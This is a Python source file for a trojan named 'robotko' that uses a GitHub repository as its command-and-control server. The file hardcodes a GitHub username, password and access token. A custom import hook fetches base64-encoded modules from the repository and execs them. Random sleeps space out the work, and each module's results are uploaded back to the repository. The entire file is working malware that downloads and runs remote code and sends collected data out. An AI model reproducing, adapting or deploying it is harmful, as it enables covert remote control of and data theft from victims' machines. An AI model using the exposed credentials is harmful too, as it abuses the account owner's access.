import json, base64, sys, time, imp, random, threading, os, encodings.idna
from queue import Queue
from github3 import login

#### CONFIGURE YOUR SETTINGS HERE ####
GH_USERNAME = 'unsecur3'
GH_PASSWORD = 'wNJL4u8#%ZHF'
OWNER = 'unsecur3'
REPOSITORY = 'robotko'
BRANCH = 'master'
tokenn = 'd8d65e8a31ab96ccb2dbaf5a1a0a63617fba3b37'
######################################

robotko_id = "abc"  # unique id for this robotko
relative_path = ""
robotko_config = relative_path + "config/{0}.json".format(robotko_id)
data_path = relative_path + "data/{0}/".format(robotko_id)
robotko_modules = []
configured = False
task_queue = Queue()

def connect_to_github():
	# NOTE: there is also an option to login via tokens (see docs for more info)
	# gh = login(username=GH_USERNAME, password=GH_PASSWORD)
	gh = login(token = tokenn)
	repo = gh.repository(OWNER, REPOSITORY)
	branch = repo.branch(BRANCH)

	return gh, repo, branch

def get_file_contents(filepath):
	gh, repo, branch = connect_to_github()
	# old code
	# tree = branch.commit.commit.tree.recurse()
	tree = branch.commit.commit.tree.to_tree().recurse()
	# print(20*'*')
	# print("gh, repo, branch", gh, repo, branch)
	# print("filepath - ", filepath)
	# print(type(tree))
	# print(dir(tree))
	# print(tree.tree)
	# print(tree.url)
	# print(20*'*')
	for filename in tree.tree:
		print(filename.path)
		if filepath in filename.path:
			print("[*] Found file {0}".format(filepath))
			blob = repo.blob(filename._json_data["sha"])
			return blob.content
	return None

def get_robotko_config():
	global configured
	config_json = get_file_contents(robotko_config)
	print(robotko_config)
	config = json.loads(base64.b64decode(config_json).decode(encoding="utf-8"))
	configured = True

	for task in config:
		if task["module"] not in sys.modules:
			exec("import {0}".format(task["module"]))
	return config

def store_module_result(data):
	gh, repo, branch = connect_to_github()
	remote_path = relative_path + "data/{0}/{1}.data".format(robotko_id, random.randint(1000, 1000000))
	repo.create_file(remote_path, "[robotko {0}] Adding data".format(robotko_id), data.encode("utf-8"))

class GitImporter(object):
	def __init__(self):
		self.current_module_code = ""

	def find_module(self, fullname, path=None):
		if configured:
			print("[*] Attemping to retrieve {0}".format(fullname))
			new_library = get_file_contents(relative_path + "modules/{0}".format(fullname))

			if new_library is not None:
				self.current_module_code = base64.b64decode(new_library)
				return self
		return None

	def load_module(self, name):
		module = imp.new_module(name)
		exec(self.current_module_code, module.__dict__)
		sys.modules[name] = module

		return module

def module_runner(module):
	task_queue.put(1)
	result = sys.modules[module].run()
	task_queue.get()

	# store the result in the repo
	store_module_result(result)

sys.meta_path += [GitImporter()]

# main robotko loop
while True:
	if task_queue.empty():
		config = get_robotko_config()

		for task in config:
			t = threading.Thread(target=module_runner, args=(task['module'],))
			t.start()
			time.sleep(random.randint(1, 10))
	time.sleep(random.randint(1000, 10000))
